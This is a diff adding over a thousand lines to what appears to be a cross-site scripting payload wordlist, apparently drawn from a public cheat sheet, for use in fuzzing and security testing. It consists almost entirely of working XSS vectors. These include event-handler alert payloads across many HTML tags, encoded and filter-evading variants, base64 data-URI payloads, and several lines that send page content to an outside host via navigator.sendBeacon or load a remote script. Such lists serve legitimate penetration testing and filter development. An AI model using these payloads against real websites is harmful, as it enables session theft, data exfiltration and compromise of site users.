@@ -7,6 +7,1502 @@
 <script\x0Atype="text/javascript">javascript:alert(1);</script>
 '`"><\x3Cscript>javascript:alert(1)</script>
 '`"><\x00script>javascript:alert(1)</script>
+';frames['ale'+'rt'](document.domain);//
+';frames[/*a*/'alert'](document.domain);//
+';globalThis['ale'+'rt'](document.domain);//
+';globalThis[/*a*/'alert'](document.domain);//
+';parent['ale'+'rt'](document.domain);//
+';parent[/*a*/'alert'](document.domain);//
+';self['ale'+'rt'](document.domain);//
+';self[/*a*/'alert'](document.domain);//
+';this['ale'+'rt'](document.domain);//
+';this[/*a*/'alert'](document.domain);//
+';top['ale'+'rt'](document.domain);//
+';top[/*a*/'alert'](document.domain);//
+';window['ale'+'rt'](document.domain);//
+';window[/*a*/'alert'](document.domain);//
+/?param=<data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
+/?xss=document.cookie
+<!-- ><img title="--><iframe/onload=alert(1)>"> --> <!-- ><img title="--><iframe/onload=alert(1)>"> -->
+<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
+<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
+<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert("XSS")</SCRIPT>"></BODY></HTML>
+<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<img src=1 onerror=alert(1)>"> </BODY></HTML>
+<IMG SRC='vbscript:msgbox("XSS")'>
+<Input value = "XSS" type = text>
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+<SCRIPT SRC=HTTPS://PORTSWIGGER-LABS.NET/A.JS></SCRIPT>
+<SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
+<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<XML SRC="xsstest.xml" ID=I></XML>
+<XSS STYLE="behavior: url(xss.htc);">
+<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe
+<a href=" &#14;  javascript:alert('XSS');">Click Me</a>
+<a href=" javascript:alert(1)">XSS</a>
+<a href="#" onclick="jscript.compact:alert(1);">test</a> <a href="#" onclick="JSCRIPT.COMPACT:alert(1);">test</a>
+<a href="%0aalert(1)" onclick="protocol='javascript'">test</a>
+<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">Click Me!</a> href="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">Click Me</a>
+<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29">Click Me</a>
+<a href="JaVaScript:alert(1)">XSS</a>
+<a href="jav   ascript:alert('XSS');">Click Me</a>
+<a href="jav&#x09;ascript:alert('XSS');">Click Me</a>
+<a href="jav&#x0A;ascript:alert('XSS');">Click Me</a>
+<a href="jav&#x0D;ascript:alert('XSS');">Click Me</a>
+<a href="javas cript:alert(1)">XSS</a>
+<a href="javascript :alert(1)">XSS</a>
+<a href="javascript://%0aalert(1)">XSS</a>
+<a href="javascript:alert(String.fromCharCode(88,83,83))">Click Me!</a>
+<a href="vbscript:MsgBox+1">XSS</a> <a href="#" onclick="vbs:Msgbox+1">XSS</a> <a href="#" onclick="VBS:Msgbox+1">XSS</a> <a href="#" onclick="vbscript:Msgbox+1">XSS</a> <a href="#" onclick="VBSCRIPT:Msgbox+1">XSS</a> <a href="#" language=vbs onclick="vbscript:Msgbox+1">XSS</a>
+<a href=# language="JScript.Encode" onclick="#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@">XSS</a> <a href=# onclick="JScript.Encode:#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@">XSS</a>
+<a id=x onbeforematch=alert(1) hidden=until-found>
+<a onbeforepaste=alert(1)>XSS</a>
+<a onsecuritypolicyviolation=alert(1)>XSS</a>
+<a ontouchcancel=alert(1)>XSS</a>
+<a2 id=x onbeforematch=alert(1) hidden=until-found>
+<a2 onbeforepaste=alert(1)>XSS</a2>
+<a2 onsecuritypolicyviolation=alert(1)>XSS</a2>
+<a2 ontouchcancel=alert(1)>XSS</a2>
+<abbr id=x onbeforematch=alert(1) hidden=until-found>
+<abbr onbeforepaste=alert(1)>XSS</abbr>
+<abbr onsecuritypolicyviolation=alert(1)>XSS</abbr>
+<abbr ontouchcancel=alert(1)>XSS</abbr>
+<acronym id=x onbeforematch=alert(1) hidden=until-found>
+<acronym onbeforepaste=alert(1)>XSS</acronym>
+<acronym onsecuritypolicyviolation=alert(1)>XSS</acronym>
+<acronym ontouchcancel=alert(1)>XSS</acronym>
+<address id=x onbeforematch=alert(1) hidden=until-found>
+<address onbeforepaste=alert(1)>XSS</address>
+<address onscrollsnapchange=alert(1) style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></address>
+<address onsecuritypolicyviolation=alert(1)>XSS</address>
+<address ontouchcancel=alert(1)>XSS</address>
+<animate id=x onbeforematch=alert(1) hidden=until-found>
+<animate onbeforepaste=alert(1)>XSS</animate>
+<animate onsecuritypolicyviolation=alert(1)>XSS</animate>
+<animate ontouchcancel=alert(1)>XSS</animate>
+<animatemotion id=x onbeforematch=alert(1) hidden=until-found>
+<animatemotion onbeforepaste=alert(1)>XSS</animatemotion>
+<animatemotion onsecuritypolicyviolation=alert(1)>XSS</animatemotion>
+<animatemotion ontouchcancel=alert(1)>XSS</animatemotion>
+<animatetransform id=x onbeforematch=alert(1) hidden=until-found>
+<animatetransform onbeforepaste=alert(1)>XSS</animatetransform>
+<animatetransform onsecuritypolicyviolation=alert(1)>XSS</animatetransform>
+<animatetransform ontouchcancel=alert(1)>XSS</animatetransform>
+<applet id=x onbeforematch=alert(1) hidden=until-found>
+<applet onbeforepaste=alert(1)>XSS</applet>
+<applet onsecuritypolicyviolation=alert(1)>XSS</applet>
+<applet ontouchcancel=alert(1)>XSS</applet>
+<area id=x onbeforematch=alert(1) hidden=until-found>
+<area onbeforepaste=alert(1)>XSS</area>
+<area onsecuritypolicyviolation=alert(1)>XSS</area>
+<area ontouchcancel=alert(1)>XSS</area>
+<article id=x onbeforematch=alert(1) hidden=until-found>
+<article onbeforepaste=alert(1)>XSS</article>
+<article onscrollsnapchange=alert(1) style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></article>
+<article onsecuritypolicyviolation=alert(1)>XSS</article>
+<article ontouchcancel=alert(1)>XSS</article>
+<aside id=x onbeforematch=alert(1) hidden=until-found>
+<aside onbeforepaste=alert(1)>XSS</aside>
+<aside onscrollsnapchange=alert(1) style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></aside>
+<aside onsecuritypolicyviolation=alert(1)>XSS</aside>
+<aside ontouchcancel=alert(1)>XSS</aside>
+<audio controls onwaiting=alert(1)><source src=x type=x></audio>
+<audio id=x onbeforematch=alert(1) hidden=until-found>
+<audio onbeforepaste=alert(1)>XSS</audio>
+<audio onsecuritypolicyviolation=alert(1)>XSS</audio>
+<audio ontouchcancel=alert(1)>XSS</audio>
+<audio2 id=x onbeforematch=alert(1) hidden=until-found>
+<audio2 onbeforepaste=alert(1)>XSS</audio2>
+<audio2 onsecuritypolicyviolation=alert(1)>XSS</audio2>
+<audio2 ontouchcancel=alert(1)>XSS</audio2>
+<b id=x onbeforematch=alert(1) hidden=until-found>
+<b onbeforepaste=alert(1)>XSS</b>
+<b onsecuritypolicyviolation=alert(1)>XSS</b>
+<b ontouchcancel=alert(1)>XSS</b>
+<base href="javascript:/a/-alert(1)///////"><a href=../lol/safari.html>test</a>
+<bdi id=x onbeforematch=alert(1) hidden=until-found>
+<bdi onbeforepaste=alert(1)>XSS</bdi>
+<bdi onsecuritypolicyviolation=alert(1)>XSS</bdi>
+<bdi ontouchcancel=alert(1)>XSS</bdi>
+<bdo id=x onbeforematch=alert(1) hidden=until-found>
+<bdo onbeforepaste=alert(1)>XSS</bdo>
+<bdo onsecuritypolicyviolation=alert(1)>XSS</bdo>
+<bdo ontouchcancel=alert(1)>XSS</bdo>
+<big id=x onbeforematch=alert(1) hidden=until-found>
+<big onbeforepaste=alert(1)>XSS</big>
+<big onsecuritypolicyviolation=alert(1)>XSS</big>
+<big ontouchcancel=alert(1)>XSS</big>
+<blink id=x onbeforematch=alert(1) hidden=until-found>
+<blink onbeforepaste=alert(1)>XSS</blink>
+<blink onsecuritypolicyviolation=alert(1)>XSS</blink>
+<blink ontouchcancel=alert(1)>XSS</blink>
+<blockquote id=x onbeforematch=alert(1) hidden=until-found>
+<blockquote onbeforepaste=alert(1)>XSS</blockquote>
+<blockquote onscrollsnapchange=alert(1) style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></blockquote>
+<blockquote onsecuritypolicyviolation=alert(1)>XSS</blockquote>
+<blockquote ontouchcancel=alert(1)>XSS</blockquote>
+<body id=x onbeforematch=alert(1) hidden=until-found>
+<body onbeforepaste=alert(1)>XSS</body>
+<body onbeforeprint=console.log(1)>
+<body onbeforeunload=navigator.sendBeacon('//ssl.portswigger-labs.net/',document.body.innerHTML)>
+<body onhashchange="print()">
+<body onload="throw onerror=eval,'/*'+location">
+<body onload="throw onerror=eval,{lineNumber:1,columnNumber:1,fileName:1,message:'/*'+location}">
+<body onmessage=print()>
+<body onpagehide=navigator.sendBeacon('//ssl.portswigger-labs.net/',document.body.innerHTML)>
+<body onpagereveal=alert(1)>
+<body onpageswap=navigator.sendBeacon('//ssl.portswigger-labs.net/',document.body.innerHTML)>
+<body onpopstate=print()>
+<body onresize="print()">
+<body onsecuritypolicyviolation=alert(1)>XSS</body>
+<body ontouchcancel=alert(1)>XSS</body>
+<body onunload=navigator.sendBeacon('//ssl.portswigger-labs.net/',document.body.innerHTML)>
+<br id=x onbeforematch=alert(1) hidden=until-found>
+<br onbeforepaste=alert(1)>XSS</br>
+<br onsecuritypolicyviolation=alert(1)>XSS</br>
+<br ontouchcancel=alert(1)>XSS</br>
+<button commandfor=test command=show-popover>Click<div id=test oncommand=alert(1)>
+<button id=x onbeforematch=alert(1) hidden=until-found>
+<button onbeforepaste=alert(1)>XSS</button>
+<button onsecuritypolicyviolation=alert(1)>XSS</button>
+<button ontouchcancel=alert(1)>XSS</button>
+<button popovertarget=x>Click me</button><geolocation onbeforetoggle=alert(1) popover id=x>XSS</geolocation>
+<button popovertarget=x>Click me</button><geolocation ontoggle=alert(1) popover id=x>XSS</geolocation>
+<button popovertarget=x>Click me</button><xss ontoggle=alert(1) popover id=x>XSS</xss>
+<canvas id=x onbeforematch=alert(1) hidden=until-found>
+<canvas onbeforepaste=alert(1)>XSS</canvas>
+<canvas onsecuritypolicyviolation=alert(1)>XSS</canvas>
+<canvas ontouchcancel=alert(1)>XSS</canvas>
+<caption id=x onbeforematch=alert(1) hidden=until-found>
+<caption onbeforepaste=alert(1)>XSS</caption>
+<caption onsecuritypolicyviolation=alert(1)>XSS</caption>
+<caption ontouchcancel=alert(1)>XSS</caption>
+<center id=x onbeforematch=alert(1) hidden=until-found>
+<center onbeforepaste=alert(1)>XSS</center>
+<center onsecuritypolicyviolation=alert(1)>XSS</center>
+<center ontouchcancel=alert(1)>XSS</center>
+<cite id=x onbeforematch=alert(1) hidden=until-found>
+<cite onbeforepaste=alert(1)>XSS</cite>
+<cite onsecuritypolicyviolation=alert(1)>XSS</cite>
+<cite ontouchcancel=alert(1)>XSS</cite>
+<code id=x onbeforematch=alert(1) hidden=until-found>
+<code onbeforepaste=alert(1)>XSS</code>
+<code onsecuritypolicyviolation=alert(1)>XSS</code>
+<code ontouchcancel=alert(1)>XSS</code>
+<col id=x onbeforematch=alert(1) hidden=until-found>
+<col onbeforepaste=alert(1)>XSS</col>
+<col onsecuritypolicyviolation=alert(1)>XSS</col>
+<col ontouchcancel=alert(1)>XSS</col>
+<colgroup id=x onbeforematch=alert(1) hidden=until-found>
+<colgroup onbeforepaste=alert(1)>XSS</colgroup>
+<colgroup onsecuritypolicyviolation=alert(1)>XSS</colgroup>
+<colgroup ontouchcancel=alert(1)>XSS</colgroup>
+<command id=x onbeforematch=alert(1) hidden=until-found>
+<command onbeforepaste=alert(1)>XSS</command>
+<command onsecuritypolicyviolation=alert(1)>XSS</command>
+<command ontouchcancel=alert(1)>XSS</command>
+<content id=x onbeforematch=alert(1) hidden=until-found>
+<content onbeforepaste=alert(1)>XSS</content>
+<content onsecuritypolicyviolation=alert(1)>XSS</content>
+<content ontouchcancel=alert(1)>XSS</content>
+<data id=x onbeforematch=alert(1) hidden=until-found>
+<data onbeforepaste=alert(1)>XSS</data>
+<data onsecuritypolicyviolation=alert(1)>XSS</data>
+<data ontouchcancel=alert(1)>XSS</data>
+<datalist id=x onbeforematch=alert(1) hidden=until-found>
+<datalist onbeforepaste=alert(1)>XSS</datalist>
+<datalist onsecuritypolicyviolation=alert(1)>XSS</datalist>
+<datalist ontouchcancel=alert(1)>XSS</datalist>
+<dd id=x onbeforematch=alert(1) hidden=until-found>
+<dd onbeforepaste=alert(1)>XSS</dd>
+<dd onscrollsnapchange=alert(1) style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></dd>
+<dd onsecuritypolicyviolation=alert(1)>XSS</dd>
+<dd ontouchcancel=alert(1)>XSS</dd>
+<del id=x onbeforematch=alert(1) hidden=until-found>
+<del onbeforepaste=alert(1)>XSS</del>
+<del onsecuritypolicyviolation=alert(1)>XSS</del>
+<del ontouchcancel=alert(1)>XSS</del>
+<details id=x onbeforematch=alert(1) hidden=until-found>
+<details onbeforepaste=alert(1)>XSS</details>
+<details onsecuritypolicyviolation=alert(1)>XSS</details>
+<details ontouchcancel=alert(1)>XSS</details>
+<dfn id=x onbeforematch=alert(1) hidden=until-found>
+<dfn onbeforepaste=alert(1)>XSS</dfn>
+<dfn onsecuritypolicyviolation=alert(1)>XSS</dfn>
+<dfn ontouchcancel=alert(1)>XSS</dfn>
+<dialog id=x onbeforematch=alert(1) hidden=until-found>
+<dialog onbeforepaste=alert(1)>XSS</dialog>
+<dialog onsecuritypolicyviolation=alert(1)>XSS</dialog>
+<dialog ontouchcancel=alert(1)>XSS</dialog>
+<dir id=x onbeforematch=alert(1) hidden=until-found>
+<dir onbeforepaste=alert(1)>XSS</dir>
+<dir onsecuritypolicyviolation=alert(1)>XSS</dir>
+<dir ontouchcancel=alert(1)>XSS</dir>
+<div draggable="true" contenteditable>drag me</div><geolocation ondragover=alert(1) contenteditable style=display:block>drop here</geolocation>
+<div draggable="true" contenteditable>drag me</div><geolocation ondrop=alert(1) contenteditable style=display:block>drop here</geolocation>
+<div draggable="true" contenteditable>drag me</div><xss ondragover=alert(1) contenteditable style=display:block>drop here</xss>
+<div draggable="true" contenteditable>drag me</div><xss ondrop=alert(1) contenteditable style=display:block>drop here</xss>
+<div id=x onbeforematch=alert(1) hidden=until-found>
+<div onbeforepaste=alert(1)>XSS</div>
+<div ongesturechange=alert(1)>XSS</div>
+<div ongestureend=alert(1)>XSS</div>
+<div ongesturestart=alert(1)>XSS</div>
+<div onscrollsnapchange=alert(1) style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></div>
+<div onsecuritypolicyviolation=alert(1)>XSS</div>
+<div ontouchcancel=alert(1)>XSS</div>
+<div style="-moz-binding:url(//businessinfo.co.uk/labs/xbl/xbl.xml#xss)"> <div style="\-\mo\z-binding:url(//businessinfo.co.uk/labs/xbl/xbl.xml#xss)"> <div style="-moz-bindin\67:url(//businessinfo.co.uk/lab s/xbl/xbl.xml#xss)"> <div style="-moz-bindin&#x5c;67:url(//businessinfo.co.uk/lab s/xbl/xbl.xml#xss)">
+<div style=xss:expression(alert(1))> <div style=xss:expression(1)-alert(1)> <div style=xss:expressio\6e(alert(1))> <div style=xss:expressio\006e(alert(1))> <div style=xss:expressio\00006e(alert(1))> <div style=xss:expressio\6e(alert(1))> <div style=xss:expressio&#x5c;6e(alert(1))>
+<div style=xss=expression(alert(1))> <div style="color&#x3dred">test</div>
+<dl id=x onbeforematch=alert(1) hidden=until-found>
+<dl onbeforepaste=alert(1)>XSS</dl>
+<dl onsecuritypolicyviolation=alert(1)>XSS</dl>
+<dl ontouchcancel=alert(1)>XSS</dl>
+<dt id=x onbeforematch=alert(1) hidden=until-found>
+<dt onbeforepaste=alert(1)>XSS</dt>
+<dt onscrollsnapchange=alert(1) style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></dt>
+<dt onsecuritypolicyviolation=alert(1)>XSS</dt>
+<dt ontouchcancel=alert(1)>XSS</dt>
+<element id=x onbeforematch=alert(1) hidden=until-found>
+<element onbeforepaste=alert(1)>XSS</element>
+<element onsecuritypolicyviolation=alert(1)>XSS</element>
+<element ontouchcancel=alert(1)>XSS</element>
+<em id=x onbeforematch=alert(1) hidden=until-found>
+<em onbeforepaste=alert(1)>XSS</em>
+<em onsecuritypolicyviolation=alert(1)>XSS</em>
+<em ontouchcancel=alert(1)>XSS</em>
+<embed id=x onbeforematch=alert(1) hidden=until-found>
+<embed onbeforepaste=alert(1)>XSS</embed>
+<embed onsecuritypolicyviolation=alert(1)>XSS</embed>
+<embed ontouchcancel=alert(1)>XSS</embed>
+<embed src="# alert(1)" codebase=javascript://>
+<embed src="#! alert(1)" codebase=javascript:>
+<embed src=# codebase=javascript:alert(document.domain)//>
+<fieldset id=x onbeforematch=alert(1) hidden=until-found>
+<fieldset onbeforepaste=alert(1)>XSS</fieldset>
+<fieldset onscrollsnapchange=alert(1) style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></fieldset>
+<fieldset onsecuritypolicyviolation=alert(1)>XSS</fieldset>
+<fieldset ontouchcancel=alert(1)>XSS</fieldset>
+<figcaption id=x onbeforematch=alert(1) hidden=until-found>
+<figcaption onbeforepaste=alert(1)>XSS</figcaption>
+<figcaption onscrollsnapchange=alert(1) style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></figcaption>
+<figcaption onsecuritypolicyviolation=alert(1)>XSS</figcaption>
+<figcaption ontouchcancel=alert(1)>XSS</figcaption>
+<figure id=x onbeforematch=alert(1) hidden=until-found>
+<figure onbeforepaste=alert(1)>XSS</figure>
+<figure onsecuritypolicyviolation=alert(1)>XSS</figure>
+<figure ontouchcancel=alert(1)>XSS</figure>
+<font id=x onbeforematch=alert(1) hidden=until-found>
+<font onbeforepaste=alert(1)>XSS</font>
+<font onsecuritypolicyviolation=alert(1)>XSS</font>
+<font ontouchcancel=alert(1)>XSS</font>
+<footer id=x onbeforematch=alert(1) hidden=until-found>
+<footer onbeforepaste=alert(1)>XSS</footer>
+<footer onscrollsnapchange=alert(1) style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></footer>
+<footer onsecuritypolicyviolation=alert(1)>XSS</footer>
+<footer ontouchcancel=alert(1)>XSS</footer>
+<form action=javascript:alert(1)>
+<form action=x><button>XSS</button><select name=x><option><plaintext><script>token="supersecret"</script>
+<form id=x onbeforematch=alert(1) hidden=until-found>
+<form onbeforepaste=alert(1)>XSS</form>
+<form onscrollsnapchange=alert(1) style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></form>
+<form onsecuritypolicyviolation=alert(1)>XSS</form>
+<form ontouchcancel=alert(1)>XSS</form>
+<form><button formaction=javascript:alert(1)>
+<form><button name=x formaction=x><b>stealme
+<frame id=x onbeforematch=alert(1) hidden=until-found>
+<frame onbeforepaste=alert(1)>XSS</frame>
+<frame onsecuritypolicyviolation=alert(1)>XSS</frame>
+<frame ontouchcancel=alert(1)>XSS</frame>
+<frameset id=x onbeforematch=alert(1) hidden=until-found>
+<frameset onbeforepaste=alert(1)>XSS</frameset>
+<frameset onsecuritypolicyviolation=alert(1)>XSS</frameset>
+<frameset ontouchcancel=alert(1)>XSS</frameset>
+<geolocation autolocate onlocation=alert(1)>
+<geolocation contenteditable onbeforeinput=alert(1)>test
+<geolocation draggable="true" ondrag="alert(1)" style=display:block>test</geolocation>
+<geolocation draggable="true" ondragend="alert(1)" style=display:block>test</geolocation>
+<geolocation draggable="true" ondragenter="alert(1)" style=display:block>test</geolocation>
+<geolocation draggable="true" ondragexit="alert(1)" style=display:block>test</geolocation>
+<geolocation draggable="true" ondragleave="alert(1)" style=display:block>test</geolocation>
+<geolocation draggable="true" ondragstart="alert(1)" style=display:block>test</geolocation>
+<geolocation id=x onbeforematch=alert(1) hidden=until-found>
+<geolocation id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></geolocation>
+<geolocation onbeforepaste=alert(1)>XSS</geolocation>
+<geolocation onblur=alert(1) id=x tabindex=1 style=display:block>test</geolocation><input value=clickme>
+<geolocation onclick="alert(1)" style=display:block>test</geolocation>
+<geolocation oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto>
+<geolocation oncontextmenu="alert(1)" style=display:block>test</geolocation>
+<geolocation oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<geolocation oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<geolocation ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</geolocation>
+<geolocation onfocus=alert(1) autofocus tabindex=1>
+<geolocation onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</geolocation><input value=clickme>
+<geolocation onkeydown="alert(1)" contenteditable style=display:block>test</geolocation>
+<geolocation onkeypress="alert(1)" contenteditable style=display:block>test</geolocation>
+<geolocation onkeyup="alert(1)" contenteditable style=display:block>test</geolocation>
+<geolocation onmousedown="alert(1)" style=display:block>test</geolocation>
+<geolocation onmouseenter="alert(1)" style=display:block>test</geolocation>
+<geolocation onmouseleave="alert(1)" style=display:block>test</geolocation>
+<geolocation onmousemove="alert(1)" style=display:block>test</geolocation>
+<geolocation onmouseout="alert(1)" style=display:block>test</geolocation>
+<geolocation onmouseover="alert(1)" style=display:block>test</geolocation>
+<geolocation onmouseup="alert(1)" style=display:block>test</geolocation>
+<geolocation onmousewheel=alert(1) style=display:block>requires scrolling
+<geolocation onpointercancel=alert(1)>XSS</geolocation>
+<geolocation onpointerdown=alert(1) style=display:block>XSS</geolocation>
+<geolocation onpointerenter=alert(1) style=display:block>XSS</geolocation>
+<geolocation onpointerleave=alert(1) style=display:block>XSS</geolocation>
+<geolocation onpointermove=alert(1) style=display:block>XSS</geolocation>
+<geolocation onpointerout=alert(1) style=display:block>XSS</geolocation>
+<geolocation onpointerover=alert(1) style=display:block>XSS</geolocation>
+<geolocation onpointerrawupdate=alert(1) style=display:block>XSS</geolocation>
+<geolocation onpointerup=alert(1) style=display:block>XSS</geolocation>
+<geolocation onpromptaction=alert(1)>
+<geolocation onpromptdismiss=alert(1)>
+<geolocation onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></geolocation>
+<geolocation onsecuritypolicyviolation=alert(1)>XSS</geolocation>
+<geolocation ontouchcancel=alert(1)>XSS</geolocation>
+<geolocation onvalidationstatuschange=alert(1)>
+<geolocation onwebkitmouseforcechanged=alert(1)>XSS</geolocation>
+<geolocation onwebkitmouseforcedown=alert(1)>XSS</geolocation>
+<geolocation onwebkitmouseforceup=alert(1)>XSS</geolocation>
+<geolocation onwebkitmouseforcewillbegin=alert(1)>XSS</geolocation>
+<geolocation onwebkitwillrevealbottom=alert(1)>XSS</geolocation>
+<h1 id=x onbeforematch=alert(1) hidden=until-found>
+<h1 onbeforepaste=alert(1)>XSS</h1>
+<h1 onsecuritypolicyviolation=alert(1)>XSS</h1>
+<h1 ontouchcancel=alert(1)>XSS</h1>
+<head id=x onbeforematch=alert(1) hidden=until-found>
+<head onbeforepaste=alert(1)>XSS</head>
+<head onsecuritypolicyviolation=alert(1)>XSS</head>
+<head ontouchcancel=alert(1)>XSS</head>
+<header id=x onbeforematch=alert(1) hidden=until-found>
+<header onbeforepaste=alert(1)>XSS</header>
+<header onscrollsnapchange=alert(1) style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></header>
+<header onsecuritypolicyviolation=alert(1)>XSS</header>
+<header ontouchcancel=alert(1)>XSS</header>
+<hgroup id=x onbeforematch=alert(1) hidden=until-found>
+<hgroup onbeforepaste=alert(1)>XSS</hgroup>
+<hgroup onsecuritypolicyviolation=alert(1)>XSS</hgroup>
+<hgroup ontouchcancel=alert(1)>XSS</hgroup>
+<hr id=x onbeforematch=alert(1) hidden=until-found>
+<hr onbeforepaste=alert(1)>XSS</hr>
+<hr onsecuritypolicyviolation=alert(1)>XSS</hr>
+<hr ontouchcancel=alert(1)>XSS</hr>
+<html id=x onbeforematch=alert(1) hidden=until-found>
+<html onbeforepaste=alert(1)>XSS</html>
+<html onsecuritypolicyviolation=alert(1)>XSS</html>
+<html ontouchcancel=alert(1)>XSS</html>
+<i id=x onbeforematch=alert(1) hidden=until-found>
+<i onbeforepaste=alert(1)>XSS</i>
+<i onsecuritypolicyviolation=alert(1)>XSS</i>
+<i ontouchcancel=alert(1)>XSS</i>
+<iframe id=x onbeforematch=alert(1) hidden=until-found>
+<iframe onbeforepaste=alert(1)>XSS</iframe>
+<iframe onload=VBScript.Encode:#@~^CAAAAA==\ko$K6,FoQIAAA==^#~@> <iframe language=VBScript.Encode onload=#@~^CAAAAA==\ko$K6,FoQIAAA==^#~@>
+<iframe onsecuritypolicyviolation=alert(1)>XSS</iframe>
+<iframe ontouchcancel=alert(1)>XSS</iframe>
+<iframe2 id=x onbeforematch=alert(1) hidden=until-found>
+<iframe2 onbeforepaste=alert(1)>XSS</iframe2>
+<iframe2 onsecuritypolicyviolation=alert(1)>XSS</iframe2>
+<iframe2 ontouchcancel=alert(1)>XSS</iframe2>
+<image id=x onbeforematch=alert(1) hidden=until-found>
+<image onbeforepaste=alert(1)>XSS</image>
+<image onsecuritypolicyviolation=alert(1)>XSS</image>
+<image ontouchcancel=alert(1)>XSS</image>
+<image2 id=x onbeforematch=alert(1) hidden=until-found>
+<image2 onbeforepaste=alert(1)>XSS</image2>
+<image2 onsecuritypolicyviolation=alert(1)>XSS</image2>
+<image2 ontouchcancel=alert(1)>XSS</image2>
+<image3 id=x onbeforematch=alert(1) hidden=until-found>
+<image3 onbeforepaste=alert(1)>XSS</image3>
+<image3 onsecuritypolicyviolation=alert(1)>XSS</image3>
+<image3 ontouchcancel=alert(1)>XSS</image3>
+<img id=x onbeforematch=alert(1) hidden=until-found>
+<img onbeforepaste=alert(1)>XSS</img>
+<img onsecuritypolicyviolation=alert(1)>XSS</img>
+<img ontouchcancel=alert(1)>XSS</img>
+<img src onerror=src=1,attributes[1].value=alt+id alt=ale id=rt(1)>
+<img/src/onerror="window.onload=setTimeout;Event.prototype.name='alert\x281\x29'">
+<img/src/onerror=innerHTML=URL,innerHTML=textContent>
+<img/src/onerror=window.onerror=eval;ReferenceError.prototype.name=';alert\x281\x29;'>
+<img/src/style=transition:0.1s onerror="window.ontransitionstart=setTimeout;Event.prototype.toString=x=>'alert\x281\x29'">
+<img2 id=x onbeforematch=alert(1) hidden=until-found>
+<img2 onbeforepaste=alert(1)>XSS</img2>
+<img2 onsecuritypolicyviolation=alert(1)>XSS</img2>
+<img2 ontouchcancel=alert(1)>XSS</img2>
+<input id=x onbeforematch=alert(1) hidden=until-found>
+<input onbeforepaste=alert(1)>XSS</input>
+<input onfocus="attributes[0].value=id+URL+id,new onfocus" autofocus>
+<input onsecuritypolicyviolation=alert(1)>XSS</input>
+<input ontouchcancel=alert(1)>XSS</input>
+<input type=file oncancel=alert(1)>
+<input type=range ongotpointercapture=alert(1)>
+<input type=range onlostpointercapture=alert(1)>
+<input value=x autofocus onfocus="window.onselect=setTimeout;Event.prototype.message='alert\x281\x29'">
+<input2 id=x onbeforematch=alert(1) hidden=until-found>
+<input2 onbeforepaste=alert(1)>XSS</input2>
+<input2 onsecuritypolicyviolation=alert(1)>XSS</input2>
+<input2 ontouchcancel=alert(1)>XSS</input2>
+<input3 id=x onbeforematch=alert(1) hidden=until-found>
+<input3 onbeforepaste=alert(1)>XSS</input3>
